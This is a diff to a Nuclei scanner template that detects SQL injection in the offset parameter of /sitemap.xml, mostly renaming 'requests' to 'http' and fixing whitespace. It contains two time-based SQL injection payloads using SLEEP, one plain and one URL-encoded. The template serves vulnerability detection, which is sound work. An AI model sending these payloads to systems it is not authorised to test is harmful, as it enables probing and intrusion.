@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: sitemap-sql-injection
 info:
   name: SQL injection in /sitemap.xml and offset parameter
@@ -7,14 +8,14 @@ info:
     - sql-injection
     - sitemap.xml
     - offset-parameter
- 
-requests:
+
+http:
   - method: GET
-    
+
     path:
       - "{{BaseURL}}/sitemap.xml?offset=1;SELECT IF((8303>8302),SLEEP(9),2356)#"
       - "{{BaseURL}}/sitemap.xml?offset=1%3BSELECT%20IF%28%288303%3E8302%29%2CSLEEP%285%29%2C2356%29%23"
-    
+
     matchers:
      - type: dsl
        dsl:
